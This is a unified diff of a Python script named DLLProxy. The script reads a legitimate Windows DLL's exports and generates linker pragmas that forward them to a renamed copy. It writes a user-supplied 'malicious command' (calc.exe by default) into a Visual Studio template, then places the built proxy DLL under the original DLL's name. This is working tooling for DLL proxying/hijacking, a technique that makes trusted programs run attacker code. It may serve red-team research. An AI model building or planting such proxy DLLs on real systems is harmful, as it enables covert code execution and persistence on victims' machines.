@@ -2,10 +2,11 @@
 
 import argparse
 import logging
-import lief
 import os
-import templates
+import pereader
 import random
+import shutil
+import templates
 
 # Logging config
 logging.basicConfig(format = '\r[%(asctime)s] %(name)-20s %(levelname)-9s %(message)s')
@@ -16,69 +17,38 @@ def randstr(n):
 	return ''.join([random.choice(list(charset)) for i in range(n)])
 
 
-def proxy(dll_name, orig_name, malicious_cmd):
-
-	# start!
-	logger.info('proxying "%s" with "%s"' % (dll_name, orig_name))
+def genVSProject(newName, origName, maliciousCmd):
 
 	# rename original DLL to "orig" name
-	try:
-		os.rename(dll_name, orig_name)
-		orig_dll = lief.parse(orig_name)
-		dll_petype = orig_dll.optional_header.magic
-		bitness, bitname = (64, '_AMD64_') if dll_petype == lief.PE.PE_TYPE.PE32_PLUS else (32, "_X86_")
-		logger.info('input DLL is %d-bits' % bitness)
+	orig_dll = pereader.PE(origName)
+	newName = newName[:-4]
+	dll_petype = orig_dll.OPTIONAL_HEADER.Magic
+	bitness = 64 if dll_petype == pereader.NT_OPTIONAL_HDR64_MAGIC else 32
+	logger.info('input DLL is %d-bits' % bitness)
 
-		EXPORTED_FUNCTIONS = {}
-		for export in orig_dll.get_export().entries:
-			isnull = False
-			if export.name == '':
-				isnull = True
-				while export.name == '' or export.name in EXPORTED_FUNCTIONS.keys():
-					export.name = randstr(8)
+	PRAGMA_COMMENTS = {}
+	for export in orig_dll.directory_entry_export.symbols.symbols:
+		if export.name == '':
+			while export.name == '' or export.name in PRAGMA_COMMENTS.keys():
+				export.name = randstr(8)
+				export.origname = f'#{export.ordinal}'
 
-			EXPORTED_FUNCTIONS[export.name] = {'ord': export.ordinal, 'null': isnull}
+		else:
+			export.origname = export.name
 
-
-	except Exception as e:
-		logger.critical('cannot rename "%s" to "%s" (%s)' % (dll_name, orig_name, str(e)))
-		return None
+		PRAGMA_COMMENTS[export.name] = f'#pragma comment(linker, "/export:{export.name}={newName}.{export.origname},@{export.ordinal}")'
 
 
-	with open('DllProxy\\user.h', 'w') as hFile:
-		hFile.write(templates.USER_H % {'BITNESS': bitname, 'MALICIOUS_CMD': malicious_cmd, 'ORIG_NAME': orig_name})
+	with open('DllProxy\\dllmain.h', 'w') as hFile:
+		hFile.write(templates.DLLMAIN_H % {'MALICIOUS_CMD': maliciousCmd, 'PRAGMA_COMMENTS': '\n'.join(PRAGMA_COMMENTS.values())})
 
-
-	with open('DllProxy\\user.c', 'w') as hFile:
-		FUNCTIONS = []
-		for name, data in EXPORTED_FUNCTIONS.items():
-			FUNCTIONS.append('void %s(char i) { fakefunc(i); fakefunc(i); return; }' % name)
-
-		ENTRIES = []
-		for name, data in EXPORTED_FUNCTIONS.items():
-			if data['null']:
-				ENTRIES.append('\t{%d, NULL, %s},' % (data['ord'], name))
-			else:
-				ENTRIES.append('\t{%d, "%s", %s},' % (data['ord'], name, name))
-
-
-		hFile.write(templates.USER_C % {'FUNCTIONS': '\n'.join(FUNCTIONS),'ENTRIES': '\n'.join(ENTRIES)})
-
-
-	with open('DllProxy\\library.def', 'w') as hFile:
-		DLL_NAME = '.'.join(os.path.split(dll_name)[-1].split('.')[:-1])
-		EXPORTS = ['\t%s\t@%d' % (name, data['ord']) for name, data in EXPORTED_FUNCTIONS.items()]
-		hFile.write(templates.LIBRARY_DEF % {'DLL_NAME': DLL_NAME, 'EXPORTS': '\n'.join(EXPORTS)})
-
-
-	return orig_dll
+	return bitness
 
 
 if __name__ == '__main__':
 
 	# args definition
 	ap = argparse.ArgumentParser()
-	ap.add_argument('--orig', '-o', dest='orig', required=False)
 	ap.add_argument('--malicious-cmd', '-m', dest='malicious_cmd', required=False, default='C:\\Windows\\System32\\calc.exe')
 	ap.add_argument('--verbose', '-v', action='store_true', default=False)
 	ap.add_argument('DLL')
@@ -89,17 +59,32 @@ if __name__ == '__main__':
 	logger.setLevel(logging.DEBUG if args.verbose else logging.INFO)
 	logger.info('welcome to DLLProxy!')
 
-	# original name to rename DLL to
-	if args.orig:
-		orig_name = args.orig
-		logger.debug('original DLL name forced to "%s"' % orig_name)
 
-	else:
-		dll_name = args.DLL.split('.')[:-1]
-		dll_name[-1] += '_orig'
-		orig_name = '.'.join(dll_name + ['dll'])
-
+	origDll = args.DLL
+	newDll = 'p-' + os.path.basename(origDll)
 
 	malicious_cmd = args.malicious_cmd.replace('\\', '\\\\')
 	malicious_cmd = malicious_cmd.replace('"', '\"')
-	data = proxy(args.DLL, orig_name, malicious_cmd)
+	bitness = genVSProject(newDll, origDll, malicious_cmd)
+	platform = 'x64' if bitness==64 else 'x86'
+
+	WARNING = f'Open solution file within Visual Studio and build the solution:\n'
+	WARNING+= f' * Configuration: Release\n'
+	WARNING+= f' * Platform: {platform}\n\n'
+	WARNING+= f'Press [ENTER] after successful build\n'
+	input(WARNING)
+
+	OUTPUT_DIR = 'dist'
+	VS_BUILD_DIR = 'Release' if bitness==32 else os.path.join('x64','Release')
+	VS_DLLNAME = 'DllProxy.dll'
+
+	if not os.path.isdir(OUTPUT_DIR):
+		os.mkdir(OUTPUT_DIR)
+
+	
+	built_proxy_dll = os.path.join(VS_BUILD_DIR, VS_DLLNAME)
+	dist_proxy_dll = os.path.join(OUTPUT_DIR, origDll)
+	dist_proxied_dll = os.path.join(OUTPUT_DIR, newDll)
+
+	shutil.copy(origDll, dist_proxied_dll)
+	shutil.copy(built_proxy_dll, dist_proxy_dll)
